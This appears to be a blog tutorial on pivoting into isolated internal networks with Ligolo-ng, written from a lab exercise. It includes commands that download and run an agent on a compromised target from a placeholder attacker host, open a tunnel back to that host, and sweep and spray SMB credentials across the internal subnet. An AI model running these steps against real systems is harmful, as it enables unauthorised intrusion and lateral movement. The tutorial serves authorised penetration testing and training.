---
title: "Ligolo-ng: Simple Network Pivoting for Pentesters"
date: 2026-01-02 10:00:00 +0800
categories: [Tools, Network Pivoting]
tags: [ligolo, pivoting, tunneling, penetration-testing, network-security]
image:
  path: /assets/img/ligolo-ng-header.png
  alt: Ligolo-ng Network Tunneling Tool
---

Network pivoting is one of those skills every pentester needs to master. You compromise one machine but the real treasure is sitting on an isolated internal network. That's where Ligolo-ng comes in.

I recently used Ligolo-ng during a lab exercise. The experience was smooth enough that I wanted to share what I learned. This isn't some marketing pitch. Just practical notes from someone who actually used the tool.

## What is Ligolo-ng?

Ligolo-ng is a network tunneling tool. It creates a tunnel through a compromised machine so you can reach networks that were previously out of bounds. Think of it like this: you broke into the lobby of a building but you need to get to the vault on the fifth floor. Ligolo-ng is your elevator.

The tool has two parts. A proxy runs on your attack machine. An agent runs on the compromised target. They talk to each other over an encrypted connection. Your attack machine can then reach any network the compromised machine can see.

## Why Not Just Use SSH Tunneling?

SSH tunneling works fine if you have SSH access. But what if you don't? What if you compromised a Windows machine through a web exploit? What if SSH is blocked or unavailable?

Ligolo-ng doesn't care how you got access. Web shell, reverse shell, whatever. As long as you can run a binary on the target you're good to go.

## Installing Ligolo-ng

On Kali Linux the installation is straightforward.

```bash
sudo apt update
sudo apt install ligolo-ng -y
```

That's it. You now have both the proxy and agent binaries. The proxy will run on your Kali machine. The agent needs to be transferred to the target.

## Setting Up the Network Interface

Before running the proxy you need to create a virtual network interface. This is where your pivoted traffic will flow.

```bash
# Create the tunnel interface
sudo ip tuntap add user root mode tun ligolo

# Bring it up
sudo ip link set ligolo up
```

You can verify the interface exists:

```bash
ip link show ligolo
```

You should see something like this:

```
ligolo: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500
```

## Adding Routes

Next you need to tell your system where to send traffic. Let's say the internal network you want to reach is 192.168.98.0/24.

```bash
# Add route to internal network
sudo ip route add 192.168.98.0/24 dev ligolo
```

Check your routing table:

```bash
ip route show | grep 192.168.98
```

You should see:

```
192.168.98.0/24 dev ligolo scope link
```

If there's already a route you'll get an error. Delete the old route first:

```bash
sudo ip route del 192.168.98.0/24
```

Then add it again.

## Starting the Proxy

Now start the Ligolo proxy on your attack machine:

```bash
sudo ligolo-proxy -selfcert -laddr 0.0.0.0:443
```

The `-selfcert` flag creates a self-signed SSL certificate. The `-laddr` flag tells it to listen on all interfaces on port 443.

You'll see output like this:

```
WARN[0000] Using default selfcert domain 'ligolo'
INFO[0000] Listening on 0.0.0.0:443
```

Leave this running. Don't close the terminal.

## Transferring the Agent

You need to get the agent binary to your compromised machine. There are several ways to do this.

### Using SCP

If you have SSH access:

```bash
scp /usr/bin/ligolo-agent user@target:/tmp/agent
```

### Using HTTP Server

If the target can download files:

On your Kali machine:

```bash
cd ~/tools
cp /usr/bin/ligolo-agent ./agent
python3 -m http.server 8000
```

On the target:

```bash
wget http://YOUR_KALI_IP:8000/agent
chmod +x agent
```

### When the Target Can't Reach the Internet

Sometimes the compromised machine can't reach GitHub or external sites. DNS might be broken or filtered. In that case use the HTTP server method. Your target can reach your Kali machine through the VPN or whatever connection you used to compromise it.

## Running the Agent

On the compromised machine run the agent:

```bash
./agent -connect YOUR_KALI_IP:443 -ignore-cert
```

Replace `YOUR_KALI_IP` with your actual IP address. Use the IP the target can reach. If you're on a VPN use that IP.

The `-ignore-cert` flag tells the agent to trust the self-signed certificate.

You should see:

```
WARN[0000] warning, certificate validation disabled
INFO[0000] Connection established
```

Back on your Kali machine the proxy will show:

```
INFO[0023] Agent joined. name=user@hostname remote="192.168.80.10:54321"
```

## Activating the Tunnel

The agent is connected but the tunnel isn't active yet. In the ligolo-proxy terminal you should see a prompt:

```
ligolo-ng »
```

Type:

```
session
```

You'll see a list of connected agents:

```
? Specify a session : 1 - user@hostname - 192.168.80.10:54321
```

Press Enter to select it.

Now type:

```
start
```

You should see:

```
INFO[xxxx] Starting tunnel to user@hostname
```

The tunnel is now active.

## Testing the Tunnel

Open a new terminal on your Kali machine. Try to ping a host on the internal network:

```bash
ping 192.168.98.2 -c 3
```

If you get replies the tunnel is working. You can now use any tool as if you were directly on the internal network:

```bash
nmap -sn 192.168.98.0/24
crackmapexec smb 192.168.98.0/24 -u username -p password
```

No need for proxychains or any special configuration. It just works.

## Common Issues and Solutions

### Issue: Route Already Exists

Error message:

```
RTNETLINK answers: File exists
```

Solution:

```bash
sudo ip route del 192.168.98.0/24
sudo ip route add 192.168.98.0/24 dev ligolo
```

### Issue: Cannot Execute Binary File

Error message:

```
bash: ./agent: cannot execute binary file: Exec format error
```

This means you downloaded the wrong architecture. Check what you need:

```bash
uname -m
```

If it says `x86_64` you need the amd64 version. If it says `aarch64` you need the arm64 version.

Make sure the downloaded file is actually a binary:

```bash
file agent
```

You should see something like:

```
agent: ELF 64-bit LSB executable, x86-64
```

If you see HTML or text the download failed. Try again.

### Issue: Connection Refused

Make sure:

1. The proxy is running on your Kali machine
2. You're using the correct IP address
3. Port 443 isn't blocked by a firewall
4. The target can actually reach your Kali machine

Test basic connectivity first:

```bash
# On target
ping YOUR_KALI_IP
```

### Issue: Agent Connects But Tunnel Doesn't Work

Make sure you:

1. Created the ligolo interface
2. Brought the interface up
3. Added the route
4. Actually typed `start` in the ligolo console

Check your route:

```bash
ip route show | grep ligolo
```

## Terminal Organization

You'll need multiple terminals running. Here's how I organize them:

- **Terminal 1**: Ligolo proxy (keep running)
- **Terminal 2**: SSH to target with agent running (keep running)
- **Terminal 3**: Ligolo console for commands (interactive)
- **Terminal 4**: Your actual work (nmap, crackmapexec, etc.)

Don't close terminals 1 and 2. They need to stay running for the tunnel to work.


## When to Use Something Else

Ligolo-ng isn't always the answer. If you need HTTP-based tunneling for stealth consider Chisel instead. If the target has strict egress filtering you might need DNS tunneling.

But for most internal network pivoting scenarios Ligolo-ng is my go-to tool now. It does one thing and does it well.

## Quick Reference

```bash
# Setup (one time)
sudo apt install ligolo-ng -y
sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 192.168.98.0/24 dev ligolo

# Start proxy
sudo ligolo-proxy -selfcert -laddr 0.0.0.0:443

# On target
./agent -connect YOUR_KALI_IP:443 -ignore-cert

# In ligolo console
session
start

# Test
ping 192.168.98.2
nmap -sn 192.168.98.0/24
```

That's everything I learned setting up Ligolo-ng. It's a solid tool. Give it a try next time you need to pivot through a compromised host.
